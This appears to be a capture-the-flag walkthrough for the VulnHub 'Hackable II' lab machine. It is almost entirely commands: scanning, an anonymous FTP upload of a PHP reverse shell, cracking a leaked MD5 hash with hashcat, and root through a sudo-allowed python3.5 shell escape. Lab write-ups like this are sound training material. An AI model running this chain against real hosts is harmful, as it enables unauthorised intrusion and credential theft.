# Hackable Series - Hackable II


1. Stage
   ```bash
   export IP=10.10.38.10
   ping -c 4 $IP
   mkdir -p nmap
   nmap -sC -Pn -o ./nmap/basic.txt $IP
   nmap -sC -sV -p- -o ./nmap/all_ports.txt $IP
   ```

2. Enumerrate dirs on port 80
   ```bash
   `gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -b 301,302,400-404`
   ```

3. Stage file to send to file server
    ```bash
    curl -i -X POST $IP:80/files \
    -H "Content-Type: text/xml" \
    --data-binary "@/home/kali/Projects/vulnhub/hackable/ii/audit.php"
    ```

4. FTP put revshell  
   ```
    ftp anonymous@$IP 
    put audit.php
   ```
    `ls -al` => -`rwxr-xr-x   1 shrek shrek  1219 Nov 26  2020 .runme.sh`  
    `cat .runme.sh` => `shrek:cf4c2232354952690368f1b3dfdfb24d`

5. Brute force password 
    ```bash
        hashcat -a 0 -m 0  "cf4c2232354952690368f1b3dfdfb24d" /usr/share/wordlists/rockyou.txt  
    ```

    password cracked: **onion**

6. Escalate Privileges
   ```bash
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    su shrek 
    onion
    find / -type f -perm /400 2>/dev/null | grep /usr/bin
   ```

   ```bash
    sudo -l
        Matching Defaults entries for shrek on ubuntu:
            env_reset, mail_badpass,
            secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

        User shrek may run the following commands on ubuntu:
            (root) NOPASSWD: /usr/bin/python3.5
    ```

   => `sudo /usr/bin/python3.5 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`  

   `cd /root && cat root.txt`  
   => Voila      
